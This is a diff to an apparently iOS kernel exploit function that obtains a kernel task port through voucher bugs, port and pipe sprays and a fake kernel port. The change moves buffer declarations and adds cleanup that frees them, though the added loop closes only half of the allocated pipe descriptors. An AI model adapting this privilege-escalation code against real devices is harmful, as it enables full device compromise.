@@ -644,6 +644,9 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     mach_port_t preport[0x1000] = { };
     mach_port_t postport[0x200] = { };
 
+    kport_t *fakeport = NULL;
+    int *pipefds = NULL;
+    void *pipebuf = NULL;
 
     /********** ********** data hunting ********** **********/
 
@@ -783,7 +786,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
 
     int total_pipes = 0x500;
     size_t total_pipes_size = total_pipes * 2 * sizeof(int);
-    int *pipefds = malloc(total_pipes_size);
+    pipefds = malloc(total_pipes_size);
     bzero(pipefds, total_pipes_size);
 
     for (size_t i = 0; i < total_pipes; i++) 
@@ -813,7 +816,7 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
 
     LOG("total pipes created: %d",total_pipes);
 
-    void *pipebuf = malloc(pagesize);
+    pipebuf = malloc(pagesize);
     bzero(pipebuf, pagesize);
 
     /* create a few vouchers used to trigger the bug */
@@ -1003,7 +1006,7 @@ found_voucher_lbl:;
     };
     LOG("new port addr: 0x%llx", new_voucher.iv_port);
 
-    kport_t *fakeport = malloc(sizeof(kport_t));
+    fakeport = malloc(sizeof(kport_t));
     bzero((void *)fakeport, sizeof(kport_t));
 
     /* set up our fakeport for use later */
@@ -1577,6 +1580,21 @@ out:;
     if (the_one)
     {
         mach_port_destroy(mach_task_self(), the_one);
+    }
+
+    if (pipefds)
+    {
+        for (int i = 0; i < total_pipes; i++)
+        {
+            close(pipefds[i]);
+        }
+
+        free(pipefds);
+    }
+
+    if (pipebuf)
+    {
+        free(pipebuf);
     }
 
     return ret;
